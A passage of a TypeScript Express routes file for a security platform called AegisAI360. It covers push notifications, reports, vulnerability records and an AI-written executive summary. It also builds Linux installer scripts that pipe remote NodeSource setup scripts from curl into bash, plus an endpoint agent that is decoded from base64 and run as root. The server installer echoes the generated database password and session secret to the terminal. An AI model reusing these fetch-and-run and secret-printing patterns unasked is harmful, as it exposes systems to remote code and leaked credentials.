      const match = userSubs.find((s: any) => s.endpoint === endpoint);
      if (!match) return res.status(404).json({ error: "Subscription not found" });
      await storage.deletePushSubscription(match.id);
      res.json({ success: true });
    } catch (error: any) {
      res.status(400).json({ error: error?.message || "Failed to unsubscribe" });
    }
  });

  app.post("/api/push/send", requireAuth, requireRole("admin"), async (req: any, res) => {
    try {
      const body = z.object({
        title: z.string().max(100),
        body: z.string().max(500),
        url: z.string().optional(),
        targetUserId: z.string().optional(),
      }).parse(req.body);

      const pushService = await import("./pushService");
      let results;
      if (body.targetUserId) {
        if (!req.user!.isSuperAdmin) {
          const targetUser = await storage.getUser(body.targetUserId);
          if (!targetUser || targetUser.organizationId !== req.user!.organizationId) {
            return res.status(403).json({ error: "Cannot send push to users outside your organization" });
          }
        }
        results = await pushService.sendPushToUser(body.targetUserId, { title: body.title, body: body.body, url: body.url });
      } else {
        if (req.user!.isSuperAdmin) {
          results = await pushService.sendPushToAll({ title: body.title, body: body.body, url: body.url });
        } else {
          results = await pushService.sendPushToUser(req.user!.id, { title: body.title, body: body.body, url: body.url });
        }
      }

      await storage.createSwTelemetry({
        userId: req.user!.id,
        eventType: "push_sent",
        eventData: { title: body.title, targetUserId: body.targetUserId, results },
      });

      res.json({ success: true, results });
    } catch (error: any) {
      res.status(400).json({ error: error?.message || "Failed to send push" });
    }
  });

  app.post("/api/sw/telemetry", requireAuth, async (req: any, res) => {
    try {
      const body = z.object({
        eventType: z.string().max(50),
        eventData: z.any().optional(),
      }).parse(req.body);

      const entry = await storage.createSwTelemetry({
        userId: req.user!.id,
        eventType: body.eventType,
        eventData: body.eventData || {},
      });

      res.json({ success: true, id: entry.id });
    } catch (error: any) {
      res.status(400).json({ error: error?.message || "Failed to record telemetry" });
    }
  });

  app.get("/api/sw/telemetry", requireAuth, async (req: any, res) => {
    try {
      const limit = Math.min(parseInt(req.query.limit as string) || 50, 200);
      const entries = await storage.getSwTelemetry(req.user!.id, limit);
      res.json(entries);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch telemetry" });
    }
  });

  app.get("/api/sw/status", requireAuth, async (req: any, res) => {
    try {
      const subs = await storage.getPushSubscriptionsByUser(req.user!.id);
      const telemetry = await storage.getSwTelemetry(req.user!.id, 20);
      res.json({
        pushSubscriptions: subs.length,
        recentTelemetry: telemetry,
        vapidConfigured: !!(process.env.VAPID_PUBLIC_KEY && process.env.VAPID_PRIVATE_KEY),
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch status" });
    }
  });

  app.get("/api/scheduled-reports", requireAuth, requireRole("admin"), async (req: any, res) => {
    try {
      const user = req.user as User;
      const reports = await storage.getScheduledReports(user.organizationId!);
      res.json(reports);
    } catch (error) {
      console.error("Failed to fetch scheduled reports:", error);
      res.status(500).json({ error: "Failed to fetch scheduled reports" });
    }
  });

  app.post("/api/scheduled-reports", requireAuth, requireRole("admin"), async (req: any, res) => {
    try {
      const user = req.user as User;
      const { reportType, frequency, recipients } = req.body;
      if (!reportType || !frequency || !recipients) {
        return res.status(400).json({ error: "reportType, frequency, and recipients are required" });
      }
      const now = new Date();
      let nextRun = new Date(now);
      if (frequency === "daily") nextRun.setDate(nextRun.getDate() + 1);
      else if (frequency === "weekly") nextRun.setDate(nextRun.getDate() + 7);
      else if (frequency === "monthly") nextRun.setMonth(nextRun.getMonth() + 1);
      nextRun.setHours(8, 0, 0, 0);

      const report = await storage.createScheduledReport({
        organizationId: user.organizationId!,
        reportType,
        frequency,
        recipients,
        enabled: true,
        nextRun,
      });
      await storage.createAuditLog({
        organizationId: user.organizationId,
        userId: user.id,
        action: "scheduled_report_created",
        targetType: "scheduled_report",
        targetId: String(report.id),
        details: `Created ${frequency} ${reportType} report`,
      });
      res.status(201).json(report);
    } catch (error) {
      console.error("Failed to create scheduled report:", error);
      res.status(500).json({ error: "Failed to create scheduled report" });
    }
  });

  app.patch("/api/scheduled-reports/:id", requireAuth, requireRole("admin"), async (req: any, res) => {
    try {
      const user = req.user as User;
      const id = parseInt(req.params.id);
      const updated = await storage.updateScheduledReport(id, user.organizationId!, req.body);
      if (!updated) return res.status(404).json({ error: "Report not found" });
      res.json(updated);
    } catch (error) {
      console.error("Failed to update scheduled report:", error);
      res.status(500).json({ error: "Failed to update scheduled report" });
    }
  });

  app.delete("/api/scheduled-reports/:id", requireAuth, requireRole("admin"), async (req: any, res) => {
    try {
      const user = req.user as User;
      const id = parseInt(req.params.id);
      const deleted = await storage.deleteScheduledReport(id, user.organizationId!);
      if (!deleted) return res.status(404).json({ error: "Report not found" });
      res.json({ success: true });
    } catch (error) {
      console.error("Failed to delete scheduled report:", error);
      res.status(500).json({ error: "Failed to delete scheduled report" });
    }
  });

  app.delete("/api/organization/users/:userId", requireAuth, requireRole("admin"), async (req: any, res) => {
    try {
      const user = req.user as User;
      const targetUserId = req.params.userId;
      if (targetUserId === user.id) {
        return res.status(400).json({ error: "Cannot delete your own account" });
      }
      const targetUser = await storage.getUser(targetUserId);
      if (!targetUser || targetUser.organizationId !== user.organizationId) {
        return res.status(404).json({ error: "User not found in your organization" });
      }
      if (targetUser.role === "admin") {
        const orgUsers = await storage.getOrganizationUsers(user.organizationId!);
        const adminCount = orgUsers.filter(u => u.role === "admin").length;
        if (adminCount <= 1) {
          return res.status(400).json({ error: "Cannot delete the last admin" });
        }
      }
      await storage.deleteOrganizationUser(targetUserId, user.organizationId!);
      await storage.createAuditLog({
        organizationId: user.organizationId,
        userId: user.id,
        action: "user_deleted",
        targetType: "user",
        targetId: targetUserId,
        details: `Deleted user "${targetUser.username}"`,
      });
      res.json({ success: true });
    } catch (error) {
      console.error("Failed to delete user:", error);
      res.status(500).json({ error: "Failed to delete user" });
    }
  });

  app.get("/api/login-history", requireAuth, requireRole("admin"), async (req: any, res) => {
    try {
      const user = req.user as User;
      const limit = parseInt(req.query.limit as string) || 100;
      const history = await storage.getLoginHistory(user.organizationId!, limit);
      res.json(history);
    } catch (error) {
      console.error("Failed to fetch login history:", error);
      res.status(500).json({ error: "Failed to fetch login history" });
    }
  });

  app.patch("/api/user/onboarding", requireAuth, async (req: any, res) => {
    try {
      const user = req.user as User;
      await storage.updateUserOnboarding(user.id, true);
      res.json({ success: true });
    } catch (error) {
      console.error("Failed to update onboarding:", error);
      res.status(500).json({ error: "Failed to update onboarding status" });
    }
  });

  app.patch("/api/user/dashboard-layout", requireAuth, async (req: any, res) => {
    try {
      const user = req.user as User;
      const { layout } = req.body;
      if (!layout || typeof layout !== "object") {
        return res.status(400).json({ error: "Layout object is required" });
      }
      await storage.updateUserDashboardLayout(user.id, layout);
      res.json({ success: true });
    } catch (error) {
      console.error("Failed to update dashboard layout:", error);
      res.status(500).json({ error: "Failed to update dashboard layout" });
    }
  });

  app.post("/api/website-recovery/start", requireAuth, async (req, res) => {
    try {
      const { url } = z.object({
        url: z.string().url("Invalid URL format"),
      }).parse(req.body);

      const user = req.user as any;
      const operationId = await startRecoveryOperation(url, user.id, user.organizationId);
      res.json({ operationId });
    } catch (error: any) {
      if (error?.name === "ZodError") {
        return res.status(400).json({ error: "Invalid URL format. Please provide a valid URL." });
      }
      console.error("Website recovery error:", error);
      res.status(400).json({ error: error.message || "Failed to start recovery operation" });
    }
  });

  app.get("/api/website-recovery/status/:id", requireAuth, async (req, res) => {
    try {
      const user = req.user as any;
      const op = getOperation(req.params.id, user.organizationId);
      if (!op) return res.status(404).json({ error: "Operation not found" });
      res.json(op);
    } catch (error: any) {
      res.status(500).json({ error: "Failed to get operation status" });
    }
  });

  app.get("/api/website-recovery/history", requireAuth, async (req, res) => {
    try {
      const user = req.user as any;
      const ops = getAllOperations(user.organizationId);
      res.json(ops.map(o => ({ id: o.id, targetUrl: o.targetUrl, status: o.status, startedAt: o.startedAt, completedAt: o.completedAt, totalFindings: o.summary?.totalFindings || 0 })));
    } catch (error: any) {
      res.status(500).json({ error: "Failed to get operation history" });
    }
  });

  app.use("/api/reports", requireAuth);

  app.post("/api/reports/ai-summary", async (req, res) => {
    try {
      const body = z.object({
        stats: z.object({
          totalEvents: z.number(),
          criticalAlerts: z.number(),
          activeIncidents: z.number(),
          threatScore: z.number(),
          eventTrend: z.number().optional().default(0),
          incidentTrend: z.number().optional().default(0),
          assetCount: z.number().optional().default(0),
          quarantineCount: z.number().optional().default(0),
          honeypotActivity: z.number().optional().default(0),
          blockedIps: z.number().optional().default(0),
          activeRules: z.number().optional().default(0),
        }),
        severityBreakdown: z.array(z.object({ name: z.string(), value: z.number() })),
        recentCriticalEvents: z.array(z.object({
          severity: z.string(),
          eventType: z.string(),
          description: z.string(),
          sourceIp: z.string().nullable().optional(),
          createdAt: z.string(),
        })).optional().default([]),
        complianceGaps: z.array(z.object({
          controlId: z.string(),
          controlName: z.string(),
          priority: z.string(),
          remediation: z.string().optional().default(""),
        })).optional(),
      }).parse(req.body);

      const eventsText = body.recentCriticalEvents.slice(0, 10).map(e =>
        `- [${e.severity.toUpperCase()}] ${e.eventType}: ${e.description} (from ${e.sourceIp || "unknown"} at ${e.createdAt})`
      ).join("\n");

      const sevText = body.severityBreakdown.map(s => `${s.name}: ${s.value}`).join(", ");

      const prompt = `You are a senior cybersecurity analyst writing an executive security briefing for C-level leadership.

Current dashboard metrics:
- Total security events (24h): ${body.stats.totalEvents}
- Critical alerts: ${body.stats.criticalAlerts}
- Active incidents: ${body.stats.activeIncidents}
- Overall threat score: ${body.stats.threatScore}/100
- Monitored assets: ${body.stats.assetCount}
- Blocked IPs: ${body.stats.blockedIps}
- Quarantined items: ${body.stats.quarantineCount}

Severity distribution: ${sevText}

Recent critical/high events:
${eventsText || "No critical events in the reporting period."}

Write a JSON response with these fields:
1. "narrative": A 2-3 paragraph executive narrative explaining the current threat landscape, written in professional tone for non-technical leadership. Include what the data means for the organization.
2. "riskFactors": An array of 3-5 key risk factors driving the current threat posture, each as a short sentence.
3. "recommendations": An array of 3-5 actionable recommendations for leadership, each as a concise action item.
${body.complianceGaps && body.complianceGaps.length > 0 ? `
4. "complianceRemediation": Given these compliance gaps:
${body.complianceGaps.map(g => `- [${g.priority}] ${g.controlId} ${g.controlName}: ${g.remediation}`).join("\n")}
Provide an array of objects with "controlId" and "aiRemediation" (a specific, actionable remediation plan for each gap).` : ""}

Respond ONLY with valid JSON, no markdown.`;

      const summCacheKey = aiCacheKey("exec-summary", JSON.stringify(body.stats || {}).substring(0, 200));
      const summCached = getCached(summCacheKey);
      let raw: string;
      if (summCached) {
        raw = summCached;
      } else {
        const completion = await openai.chat.completions.create({
          model: "gpt-4o-mini",
          messages: [
            { role: "system", content: "Cybersecurity executive briefing writer. JSON only." },
            { role: "user", content: prompt },
          ],
          temperature: 0.7,
          max_tokens: 1200,
        });
        raw = completion.choices[0]?.message?.content?.trim() || "{}";
        setCache(summCacheKey, raw);
      }
      let parsed: any;
      try {
        const cleaned = raw.replace(/^```json\s*/i, "").replace(/```\s*$/i, "");
        parsed = JSON.parse(cleaned);
      } catch {
        parsed = { narrative: raw, riskFactors: [], recommendations: [] };
      }

      res.json({
        narrative: parsed.narrative || "",
        riskFactors: parsed.riskFactors || [],
        recommendations: parsed.recommendations || [],
        complianceRemediation: parsed.complianceRemediation || [],
      });
    } catch (error: any) {
      console.error("AI summary generation error:", error);
      res.status(500).json({ error: "Failed to generate AI summary" });
    }
  });

  app.use("/api/vulnerabilities", requireAuth);

  app.get("/api/vulnerabilities", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const vulns = await storage.getVulnerabilities(orgId);
      res.json(vulns);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch vulnerabilities" });
    }
  });

  app.get("/api/vulnerabilities/stats", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const stats = await storage.getVulnerabilityStats(orgId);
      res.json(stats);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch vulnerability stats" });
    }
  });

  app.post("/api/vulnerabilities", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const data = z.object({
        cveId: z.string().optional().nullable(),
        title: z.string().min(1),
        description: z.string().min(1),
        severity: z.enum(["critical", "high", "medium", "low"]),
        cvssScore: z.string().optional().nullable(),
        affectedAssets: z.array(z.string()).optional().nullable(),
        status: z.enum(["open", "in_progress", "remediated", "accepted"]).optional().default("open"),
        assignee: z.string().optional().nullable(),
        remediationNotes: z.string().optional().nullable(),
        source: z.enum(["scan", "manual", "agent"]).optional().default("manual"),
        slaDeadline: z.string().optional().nullable(),
      }).parse(req.body);

      const vuln = await storage.createVulnerability({
        organizationId: orgId,
        ...data,
        slaDeadline: data.slaDeadline ? new Date(data.slaDeadline) : null,
      });
      res.status(201).json(vuln);
    } catch (error: any) {
      if (error?.name === "ZodError") {
        return res.status(400).json({ error: "Invalid vulnerability data" });
      }
      res.status(500).json({ error: "Failed to create vulnerability" });
    }
  });

  app.patch("/api/vulnerabilities/:id", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      const data = z.object({
        status: z.enum(["open", "in_progress", "remediated", "accepted"]).optional(),
        assignee: z.string().optional().nullable(),
        remediationNotes: z.string().optional().nullable(),
        slaDeadline: z.string().optional().nullable(),
      }).parse(req.body);

      const updateData: any = { ...data };
      if (data.slaDeadline !== undefined) {
        updateData.slaDeadline = data.slaDeadline ? new Date(data.slaDeadline) : null;
      }
      if (data.status === "remediated") {
        updateData.remediatedAt = new Date();
      }

      const updated = await storage.updateVulnerability(id, orgId, updateData);
      if (!updated) return res.status(404).json({ error: "Vulnerability not found" });
      res.json(updated);
    } catch (error: any) {
      if (error?.name === "ZodError") {
        return res.status(400).json({ error: "Invalid data" });
      }
      res.status(500).json({ error: "Failed to update vulnerability" });
    }
  });

  app.post("/api/link-scanner/scan", requireAuth, async (req, res) => {
    try {
      const { url } = z.object({
        url: z.string().url("Invalid URL format"),
      }).parse(req.body);

      const result = await scanLink(url);
      res.json(result);
    } catch (error: any) {
      if (error?.name === "ZodError") {
        return res.status(400).json({ error: "Invalid URL format. Please provide a valid URL." });
      }
      console.error("Link scanner error:", error);
      res.status(500).json({ error: "Failed to scan URL" });
    }
  });

  // ─── Linux deployment installer scripts ───────────────────────────────────

  const SYSTEMD_UNIT = `[Unit]
Description=AegisAI360 SOC Platform
After=network.target postgresql.service
Requires=postgresql.service

[Service]
Type=simple
User=aegis
WorkingDirectory=/opt/aegisai360
EnvironmentFile=/opt/aegisai360/.env
ExecStart=/usr/bin/node dist/index.js
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=aegisai360

[Install]
WantedBy=multi-user.target`;

  const ENV_TEMPLATE = `DATABASE_URL=postgresql://aegis:CHANGE_ME@localhost:5432/aegisai360
SESSION_SECRET=CHANGE_THIS_TO_A_LONG_RANDOM_STRING
NODE_ENV=production
PORT=5000`;

  function makeInstallScript(distro: "ubuntu" | "centos" | "debian"): string {
    const isDebian = distro === "ubuntu" || distro === "debian";
    const nodeSetup = isDebian
      ? `curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
apt-get install -y nodejs`
      : `curl -fsSL https://rpm.nodesource.com/setup_20.x | bash -
dnf install -y nodejs`;

    const pgInstall = distro === "centos"
      ? `dnf install -y https://download.postgresql.org/pub/repos/yum/reporpms/EL-9-x86_64/pgdg-redhat-repo-latest.noarch.rpm
dnf -qy module disable postgresql
dnf install -y postgresql16-server postgresql16
/usr/pgsql-16/bin/postgresql-16-setup initdb
systemctl enable --now postgresql-16`
      : `apt-get install -y postgresql postgresql-contrib
systemctl enable --now postgresql`;

    const fw = distro === "centos"
      ? `firewall-cmd --permanent --add-port=5000/tcp
firewall-cmd --permanent --add-service=http
firewall-cmd --permanent --add-service=https
firewall-cmd --reload`
      : `ufw allow 22/tcp
ufw allow 5000/tcp
ufw --force enable`;

    const deps = isDebian
      ? `apt-get update && apt-get install -y curl gnupg2 build-essential`
      : `dnf install -y epel-release curl`;

    const nologin = isDebian ? `/usr/sbin/nologin` : `/sbin/nologin`;

    return `#!/usr/bin/env bash
# AegisAI360 — Self-Hosted Installer (${distro})
# Generated by AegisAI360 | FAHADERA LLC
# Usage: curl -fsSL https://aegisai360.com/install/${distro}.sh | sudo bash
set -euo pipefail
APPDIR=/opt/aegisai360
APPUSER=aegis

echo "━━━ AegisAI360 Installer — ${distro} ━━━"

# ── 1. System dependencies ──────────────────────────────────────────────────
echo "[1/8] Installing system dependencies..."
${deps}

# ── 2. Node.js 20 ─────────────────────────────────────────────────────────
echo "[2/8] Installing Node.js 20..."
${nodeSetup}
node --version && npm --version

# ── 3. PostgreSQL ──────────────────────────────────────────────────────────
echo "[3/8] Installing PostgreSQL..."
${pgInstall}

# ── 4. Database setup ──────────────────────────────────────────────────────
echo "[4/8] Configuring database..."
DB_PASS=$(openssl rand -base64 24 | tr -dc 'a-zA-Z0-9' | head -c 24)
sudo -u postgres psql <<SQL
CREATE USER $APPUSER WITH PASSWORD '$DB_PASS';
CREATE DATABASE aegisai360 OWNER $APPUSER;
GRANT ALL PRIVILEGES ON DATABASE aegisai360 TO $APPUSER;
SQL

# ── 5. System user & app directory ────────────────────────────────────────
echo "[5/8] Creating system user and app directory..."
useradd -r -s ${nologin} -d $APPDIR $APPUSER 2>/dev/null || true
mkdir -p $APPDIR
chown $APPUSER:$APPUSER $APPDIR

# ── 6. Environment file ────────────────────────────────────────────────────
echo "[6/8] Writing environment config..."
SESSION_SECRET=$(openssl rand -hex 32)
cat > $APPDIR/.env <<ENV
DATABASE_URL=postgresql://$APPUSER:$DB_PASS@localhost:5432/aegisai360
SESSION_SECRET=$SESSION_SECRET
NODE_ENV=production
PORT=5000
ENV
chmod 600 $APPDIR/.env
chown $APPUSER:$APPUSER $APPDIR/.env

echo ""
echo "┌─────────────────────────────────────────────────────┐"
echo "│  Generated credentials (save these securely!)       │"
echo "│  DB Password : $DB_PASS"
echo "│  Session Key : $SESSION_SECRET"
echo "└─────────────────────────────────────────────────────┘"
echo ""

# ── 7. Systemd service ─────────────────────────────────────────────────────
echo "[7/8] Installing systemd service..."
cat > /etc/systemd/system/aegisai360.service <<'UNIT'
${SYSTEMD_UNIT}
UNIT
systemctl daemon-reload

# ── 8. Firewall ───────────────────────────────────────────────────────────
echo "[8/8] Configuring firewall..."
${fw}

echo ""
echo "━━━ Installation complete ━━━"
echo ""
echo "Next steps:"
echo "  1. Deploy the AegisAI360 application files to $APPDIR"
echo "  2. Run: sudo -u $APPUSER bash -c 'cd $APPDIR && npm ci --omit=dev && npm run build'"
echo "  3. Run: sudo -u $APPUSER bash -c 'cd $APPDIR && npm run db:push'"
echo "  4. Run: sudo systemctl enable --now aegisai360"
echo "  5. Visit: http://$(hostname -I | awk '{print $1}'):5000"
echo ""
`;
  }

  app.get("/api/deploy/script/:distro", requireAuth, (req: any, res) => {
    const distro = req.params.distro as string;
    if (!["ubuntu", "centos", "debian"].includes(distro)) {
      return res.status(404).json({ error: "Unknown distro" });
    }
    const script = makeInstallScript(distro as "ubuntu" | "centos" | "debian");
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.setHeader("Content-Disposition", `attachment; filename="${distro}.sh"`);
    res.send(script);
  });

  // ─── Linux Agent package installer routes ────────────────────────────────

  const AGENT_VERSION = "8.2.1";

  function makeAgentScript(serverUrl: string, token: string): string {
    return `#!/usr/bin/env node
// AegisAI360 Linux Agent v${AGENT_VERSION}
// Generated by AegisAI360 | FAHADERA LLC
// This agent connects to the AegisAI360 cloud platform and must not be redistributed.

"use strict";
const https = require("https");
const http  = require("http");
const os    = require("os");
const { execSync } = require("child_process");

const SERVER_URL  = process.env.AEGIS_SERVER  || "${serverUrl}";
const DEVICE_TOKEN = process.env.AEGIS_TOKEN  || "${token}";
const AGENT_VERSION = "${AGENT_VERSION}";
const HEARTBEAT_INTERVAL = 60000; // 60 seconds
const TELEMETRY_INTERVAL = 300000; // 5 minutes

let agentId = null;
let connected = false;
let heartbeatTimer = null;
let telemetryTimer = null;

function request(method, path, body) {
  return new Promise((resolve, reject) => {
    const url = new URL(SERVER_URL + path);
    const isHttps = url.protocol === "https:";
    const lib = isHttps ? https : http;
    const data = body ? JSON.stringify(body) : null;
    const opts = {
      hostname: url.hostname,
      port: url.port || (isHttps ? 443 : 80),
      path: url.pathname + url.search,
      method,
      headers: {
        "Content-Type": "application/json",
        "User-Agent": \`AegisAI360-Agent/\${AGENT_VERSION} (Linux)\`,
        ...(data ? { "Content-Length": Buffer.byteLength(data) } : {}),
      },
    };
    const req = lib.request(opts, (r) => {
      let buf = "";
      r.on("data", (d) => buf += d);
      r.on("end", () => {
        try { resolve({ status: r.statusCode, body: JSON.parse(buf) }); }
        catch { resolve({ status: r.statusCode, body: buf }); }
      });
    });
    req.on("error", reject);
    if (data) req.write(data);
    req.end();
  });
}

function getSystemInfo() {
  const cpus = os.cpus();
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const cpuLoad = os.loadavg()[0];
  const cpuUsage = Math.min(100, Math.round((cpuLoad / cpus.length) * 100));
  const ramUsage = Math.round((usedMem / totalMem) * 100);
  let hostname = os.hostname();
  let localIP = "unknown";
  try {
    const nets = os.networkInterfaces();
    for (const n of Object.values(nets)) {
      for (const net of n) {
        if (net.family === "IPv4" && !net.internal) { localIP = net.address; break; }
      }
    }
  } catch {}
  return {
    hostname,
    os: \`Linux \${os.release()} (\${os.arch()})\`,
    arch: os.arch(),
    cpuUsage,
    ramUsage,
    ramTotalMB: Math.round(totalMem / 1024 / 1024),
    ramFreeMB: Math.round(freeMem / 1024 / 1024),
    cpus: cpus.length,
    uptime: \`\${Math.floor(os.uptime() / 3600)}h \${Math.floor((os.uptime() % 3600) / 60)}m\`,
    localIP,
    agentVersion: AGENT_VERSION,
    runMode: "service",
  };
}

async function register() {
  const info = getSystemInfo();
  console.log(\`[AegisAI360] Registering with \${SERVER_URL} ...\`);
  const r = await request("POST", "/api/agent/register", {
    token: DEVICE_TOKEN,
    hostname: info.hostname,
    os: info.os,
    ip: info.localIP,
  });
  if (r.status === 201) {
    agentId = r.body.agentId;
    connected = true;
    console.log(\`[AegisAI360] Registered. Agent ID: \${agentId} (status: \${r.body.status})\`);
    return true;
  } else if (r.status === 403) {
    console.error(\`[AegisAI360] ACCOUNT SUSPENDED: \${r.body.message}\`);
    console.error("[AegisAI360] This agent will not connect until the account is restored.");
    process.exit(1);
  } else {
    console.error(\`[AegisAI360] Registration failed [\${r.status}]: \${JSON.stringify(r.body)}\`);
    return false;
  }
}

async function heartbeat() {
  if (!agentId) return;
  const info = getSystemInfo();
  try {
    const r = await request("POST", "/api/agent/heartbeat", {
      agentId,
      token: DEVICE_TOKEN,
      cpuUsage: info.cpuUsage,
      ramUsage: info.ramUsage,
      ip: info.localIP,
    });
    if (r.status === 403) {
      console.error(\`[AegisAI360] ACCOUNT SUSPENDED: \${r.body.message}\`);
      console.log("[AegisAI360] Disconnecting. The service will remain installed but inactive.");
      clearInterval(heartbeatTimer);
      clearInterval(telemetryTimer);
      process.exit(1);
    } else if (r.status === 402) {
      console.error(\`[AegisAI360] SUBSCRIPTION EXPIRED: \${r.body.message}\`);
      clearInterval(heartbeatTimer);
      clearInterval(telemetryTimer);
      process.exit(1);
    } else if (r.body?.action === "disconnect") {
      console.log("[AegisAI360] Server requested disconnect. Stopping.");
      process.exit(0);
    }
  } catch (e) {
    console.warn(\`[AegisAI360] Heartbeat failed: \${e.message}\`);
  }
}

async function sendTelemetry() {
  if (!agentId) return;
  const info = getSystemInfo();
  try {
    await request("POST", "/api/agent/telemetry", { agentId, token: DEVICE_TOKEN, ...info });
  } catch {}
}

async function checkUpdate() {
  try {
    const r = await request("GET", "/api/agent/ping", null);
    if (r.body?.latestVersion && r.body.latestVersion !== AGENT_VERSION) {
      console.log(\`[AegisAI360] Update available: v\${r.body.latestVersion}. Download from aegisai360.com/download-agent\`);
    }
  } catch {}
}

async function main() {
  console.log(\`[AegisAI360] Agent v\${AGENT_VERSION} starting on \${os.hostname()}\`);
  console.log(\`[AegisAI360] Server: \${SERVER_URL}\`);

  let retries = 0;
  while (!connected && retries < 10) {
    const ok = await register();
    if (!ok) { retries++; await new Promise(r => setTimeout(r, 15000)); }
  }
  if (!connected) { console.error("[AegisAI360] Could not register after 10 attempts. Exiting."); process.exit(1); }

  heartbeatTimer  = setInterval(heartbeat,     HEARTBEAT_INTERVAL);
  telemetryTimer  = setInterval(sendTelemetry, TELEMETRY_INTERVAL);
  await sendTelemetry();
  await checkUpdate();

  process.on("SIGTERM", () => { console.log("[AegisAI360] Received SIGTERM. Shutting down."); process.exit(0); });
  process.on("SIGINT",  () => { console.log("[AegisAI360] Received SIGINT. Shutting down.");  process.exit(0); });
}

main().catch((e) => { console.error("[AegisAI360] Fatal error:", e.message); process.exit(1); });
`;
  }

  function makeLinuxPackageScript(pkgType: "deb" | "rpm" | "sh", serverUrl: string, token: string): string {
    const agentScript = makeAgentScript(serverUrl, token);
    const agentB64 = Buffer.from(agentScript).toString("base64");

    const systemdUnit = `[Unit]
Description=AegisAI360 Security Agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/node /opt/aegisai360-agent/agent.js
Restart=always
RestartSec=30
StandardOutput=journal
StandardError=journal
SyslogIdentifier=aegisai360-agent
Environment=AEGIS_SERVER=${serverUrl}
Environment=AEGIS_TOKEN=${token}

[Install]
WantedBy=multi-user.target`;

    const unitB64 = Buffer.from(systemdUnit).toString("base64");

    const commonBody = `
INSTALL_DIR="/opt/aegisai360-agent"
SERVICE_NAME="aegisai360-agent"
VERSION="${AGENT_VERSION}"

echo "━━━ AegisAI360 Agent v$VERSION Installer ━━━"
echo "Server: ${serverUrl}"
echo ""

# Check Node.js
if ! command -v node &>/dev/null; then
  echo "[!] Node.js not found. Installing Node.js 20..."
  if command -v apt-get &>/dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && apt-get install -y nodejs
  elif command -v dnf &>/dev/null; then
    curl -fsSL https://rpm.nodesource.com/setup_20.x | bash - && dnf install -y nodejs
  elif command -v yum &>/dev/null; then
    curl -fsSL https://rpm.nodesource.com/setup_20.x | bash - && yum install -y nodejs
  else
    echo "[ERROR] Cannot install Node.js automatically. Install Node.js 20+ manually then re-run."
    exit 1
  fi
fi
NODE_VERSION=$(node --version)
echo "[OK] Node.js $NODE_VERSION found"

# Create install directory
mkdir -p "$INSTALL_DIR"

# Extract agent script
echo "[>>] Installing agent to $INSTALL_DIR ..."
echo '${agentB64}' | base64 -d > "$INSTALL_DIR/agent.js"
chmod 700 "$INSTALL_DIR/agent.js"

# Create config file
cat > "$INSTALL_DIR/config.env" <<ENVEOF
AEGIS_SERVER=${serverUrl}
AEGIS_TOKEN=${token}
ENVEOF
chmod 600 "$INSTALL_DIR/config.env"

# Install systemd service
echo '${unitB64}' | base64 -d > "/etc/systemd/system/$SERVICE_NAME.service"
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl restart "$SERVICE_NAME"

echo ""
echo "━━━ Installation Complete ━━━"
echo ""
echo "  Agent ID will appear in the AegisAI360 dashboard"
echo "  at: ${serverUrl}/endpoints"
echo ""
echo "Service commands:"
echo "  Status : systemctl status $SERVICE_NAME"
echo "  Logs   : journalctl -u $SERVICE_NAME -f"
echo "  Stop   : systemctl stop $SERVICE_NAME"
echo "  Remove : systemctl disable --now $SERVICE_NAME && rm -rf $INSTALL_DIR"
echo ""
`;

    if (pkgType === "sh") {
      return `#!/usr/bin/env bash
# AegisAI360 Agent v${AGENT_VERSION} — Universal Linux Installer
# Generated for: ${serverUrl}
# FAHADERA LLC — Authorized use only
set -euo pipefail
${commonBody}`;
    }

    if (pkgType === "deb") {
      const debInstallBody = commonBody
        .replace(/mkdir -p "\$INSTALL_DIR"/g, 'mkdir -p "$PKGDIR/opt/aegisai360-agent"')
        .replace(/"\$INSTALL_DIR\//g, '"$PKGDIR/opt/aegisai360-agent/')
        .replace(/'"\/etc\/systemd\/system\/\$SERVICE_NAME\.service"'/g, '"$PKGDIR/etc/systemd/system/aegisai360-agent.service"')
        .replace(/"\/etc\/systemd\/system\/\$SERVICE_NAME\.service"/g, '"$PKGDIR/etc/systemd/system/aegisai360-agent.service"');
      const debHeader = [
        "#!/usr/bin/env bash",
        `# AegisAI360 Agent v${AGENT_VERSION} — Debian/Ubuntu Installer`,
        "# Creates and installs a .deb package",
        "set -euo pipefail",
        'PKGNAME="aegisai360-agent"',
        `VERSION="${AGENT_VERSION}"`,
        'ARCH=$(dpkg --print-architecture 2>/dev/null || echo "amd64")',
        "PKGDIR=$(mktemp -d)",
        'trap "rm -rf $PKGDIR" EXIT',
        "",
        'mkdir -p "$PKGDIR/DEBIAN" "$PKGDIR/opt/aegisai360-agent" "$PKGDIR/etc/systemd/system"',
        "",
        "# Control file",
        "cat > \"$PKGDIR/DEBIAN/control\" <<CTRL",
        "Package: $PKGNAME",
        "Version: $VERSION",
        "Architecture: $ARCH",
        "Maintainer: FAHADERA LLC <support@aegisai360.com>",
        "Description: AegisAI360 Security Agent",
        ` Cloud-connected endpoint security agent. Connects to ${serverUrl}`,
        "Depends: nodejs (>= 20)",
        "CTRL",
        "",
        "cat > \"$PKGDIR/DEBIAN/postinst\" <<'POST'",
        "#!/bin/bash",
        "systemctl daemon-reload",
        "systemctl enable aegisai360-agent",
        "systemctl restart aegisai360-agent",
        "POST",
        "chmod 755 \"$PKGDIR/DEBIAN/postinst\"",
        "",
        "cat > \"$PKGDIR/DEBIAN/prerm\" <<'PRERM'",
        "#!/bin/bash",
        "systemctl stop aegisai360-agent 2>/dev/null || true",
        "systemctl disable aegisai360-agent 2>/dev/null || true",
        "PRERM",
        "chmod 755 \"$PKGDIR/DEBIAN/prerm\"",
        "",
